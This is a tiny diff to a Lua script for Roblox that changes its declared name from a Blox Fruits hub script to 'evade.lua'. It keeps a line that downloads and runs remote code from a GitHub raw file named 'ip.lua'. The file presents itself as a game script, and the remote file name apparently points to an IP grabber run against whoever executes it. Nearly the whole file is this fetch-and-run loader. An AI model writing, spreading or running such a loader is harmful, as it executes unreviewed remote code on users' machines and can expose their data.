@@ -1,4 +1,4 @@
-_G.script_executed = "blox-fruits_ro-hub.lua"
+_G.script_executed = "evade.lua"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
 
